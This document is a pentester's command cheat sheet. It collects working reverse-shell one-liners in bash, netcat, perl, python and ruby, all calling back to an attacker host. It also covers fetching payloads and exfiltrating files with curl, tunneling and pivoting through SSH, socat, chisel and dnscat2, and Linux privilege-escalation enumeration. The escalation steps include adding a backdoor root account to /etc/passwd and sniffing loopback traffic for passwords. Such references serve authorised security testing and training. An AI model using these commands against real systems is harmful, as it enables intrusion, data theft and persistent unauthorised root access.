##Quick spawn a "web server"
python3 -m http.server 1234
nc -lnvp 1234

#Get files
wget http://192.168.12.34/badstuff.sh
curl -L http://192.168.12.34/badfile.sh > badfile.sh

#Send data out over HTTP
curl --data @/tmp/badfile http://192.168.12.34:8008/

----

##Reverse shell
On target: 
nc 123.123.123.1 1234 -e /bin/bash
bash -c "bash -i >& /dev/tcp/123.123.123.1/1234 0>&1"
mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 123.123.123.1 1234 >/tmp/f
#Thanks to O'Reilly for these: perl reverse shell depended on /bin/sh with tcp and udp and then one without /bin/sh
perl -e 'use Socket;$i="123.123.123.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -e 'use Socket;$i="123.123.123.1";$p=1234;socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"123.123.123.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>; 
rm -f /tmp/p; mknod /tmp/p p && telnet 123.123.123.1 1234 0/tmp/p
#Thanks to UB3RSEC
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.123.123.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

On listening host: nc -lvnp 1234

----

#Create a forwarder listening on port 1234 forwarding to 10.0.20.1:4321
socat -ddd TCP-LISTEN:1234,fork TCP:10.0.20.1:4321
ncat -l localhost 1234 --sh-exec "ncat 10.0.20.1 4321"
nc -l -p 1234 -c "nc 10.0.20.1 4321"

#Spawn a TTY with python3
python3 -c 'import pty; pty.spawn("/bin/bash")'

#Test for open TCP port in IP range with netcat, timeout 1s
for i in {0..255}; do nc -zv -w 1 10.0.20.$i 8080; done

#SSH local port forwarding, listening on all interfaces on on host's port 4455, forwarding through SSH tunnel between current host and 10.0.20.1 to 10.10.10.1 port 5544
#Meaning: outside<--->host:4455<->host<---SSH TUNNEL--->10.0.20.1<--->10.10.10.1:5544, -N makes sure not to open a shell and -L means local forwarding, no output after password
ssh -N -L 0.0.0.0:4455:10.10.10.1:5544 r00t@10.0.20.1

#SSH dynamic port forwarding, listening on hosts all interfaces for connections to port 3456, then forwarding traffic through a tunnel between the host an 10.0.20.1 to any destination port
#Meaning outside<--->host:3456<->host<---SSH TUNNEL--->10.0.20.1<--->any host and port on this side, this is SOCKS, so might need for example proxychains to force traffic as SOCSK
ssh -N -D 0.0.0.0:3456 r00t@10.0.20.1
#To use proxychains you'd need to add "socks5 10.0.20.1 3456" to /etc/proxychains4.conf, then just normally connect preceeding with proxychains command: proxychains smbclient -L //10.0.30.1/ -U admin --password=r00t
#You can also run nmap over this tunnel with proxychains

#SSH remote port forwarding, you need to have sshd running on your machine
# -N makes sure not to open a shell and -R means remote forwarding
# From your remote host running SSHD on localhost on port 5432 redirect through the host running this command to 10.10.10.1 port 5432 authenticating on your remote host's LAN/WAN side sshd
ssh -N -R 127.0.0.1:2345:10.10.10.1:5432 user@192.168.12.34

#SSH remote dynamic port forwarding, again you need sshd running on your machine
# -N makes sure not to open a shell and -R means remote forwarding
# Binds to your hosts loopback port 6666 from the connecting host, authenticating over your host's LAN/WAN side sshd
ssh -N -R 6666 user@192.168.12.34
#To use proxychains to pass traffic to socks you just edit socks on /etc/proxychains4.conf to:
# socks5 127.0.0.1 9998

#We can also leverage https://github.com/sshuttle/sshuttle if you want to pass certain destination networks through an SSH tunnel, this though requires high privileges
#On the "jump" host:
socat TCP-LISTEN:1234,fork TCP:10.0.20.1:22
#On your host
sshuttle -r user@192.168.11.11:1234 10.0.20.0/24 172.16.0.0/24
#Then all connections from your host over to 10.0.20.0/24 or 172.16.0.0/24 should flow through the tunnel

#Using Chisel (https://github.com/jpillora/chisel)
#Run a Chisel server on your host, bound on port 8080 and enabling reverse port forwarding
#by default when running Chisel server reverse port forwarding the socks proxy is bound to TCP 1080
chisel server --port 8008 --reverse
#On the other end use client and connect to your Chisel server, start the reverse forwarding socks
chisel client 192.168.12.34:8008 R:socks > /dev/null 2>&1 &
#Passing proxy command to ssh connection to 10.0.20.1 on your host, as ncat using socks5 proxy on host port 1080 
#%h representing the ssh command's host filled in before running the proxy command and %p representing the ssh password
#by default when running Chisel server reverse port forwarding the socks proxy is bound to TCP 1080
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.0.20.1

#Using dnscat2 (requires you to have your own domain and run the authoritative ns yourself) https://github.com/iagox86/dnscat2
dnscat2-server yourdomain.tld
#Leveragin listen
#Local post forward listening on 4444 loopback and forwarding to 10.0.20.1 port 445
window -i 1 (first check with "windows" how many you already have, by default there's only window 0)
listen 127.0.0.1:4444 172.16.2.11:445
#Make for example and SMB request through dnscat running listen on 4444
smbclient -p 4444 -L //127.0.0.1 -U user --password=passw

----

#Version info
cat /etc/issue
cat /etc/os-release
uname -a
uname -r
arch

#Network connections
netstat -tulpn
ss -tulpn

#Resolvers
cat /etc/resolv.conf
resolvectl status

#Users and in some case passwords can be found in /etc/passwd, which can be exploited if for some reason you have writes to this file
#/etc/passwd passwords precede /etc/shadow ones
openssl passwd assword
fFXEX2n561kQ2
echo "root666:fFXEX2n561kQ2:0:0:root:/root:/bin/bash" >> /etc/passwd

#FW rules are might be saved locally
cat /etc/iptables/rules.v2

#Scheduled tasks
ls -lah /etc/cron*
crontab -l
sudo crontab -l
grep "CRON" /var/log/syslog

#Installed apps
dpkg -l
apt list
rpm -a

#Find writable folders
find / -type d -writable 2>/dev/null

#List files with SUID bit set
find / -perm -u=s -type f 2>/dev/null

#Show sudoer powers
sudo -l

#Find binaries with setuid enabled, also need +ep flag to abuse (cap_setuid+ep)
/usr/sbin/getcap -r / 2>/dev/null

#List mounted/unmounted filesystems
cat /etc/fstab
mount

#List available disks
lsblk

#List modules
lsmod

#Show module details
/sbin/modinfo modulename

#Show environment variables
env

#Create a passwordlist for bruteforcing: the list indices start with four digits and then the string "foo", all combinations are then automatically created
#Min and max length both set to 7 characters
crunch 7 7 -t %%%%foo > wordlist

#run ps aux every 2 seconds and grep the results for something
watch -n 2 "ps -aux | grep something"

#Grep TCP traffic on loopback for the string "password" (requires sudo rights)
sudo tcpdump -i lo  -A | grep "password"

#Check app-armor status (requires root)
aa-status

#Connect SMB, once if succesfully connected you can "get", "ls" etc. commands
smbclient -p 445 -L //10.10.10.1/ -U admin --password=r00t

#Too lazy to enumerate manually, try unix-privesc-check
https://github.com/pentestmonkey/unix-privesc-check

#Can't remember how to leverage what? Check gtfobins:
https://gtfobins.github.io/
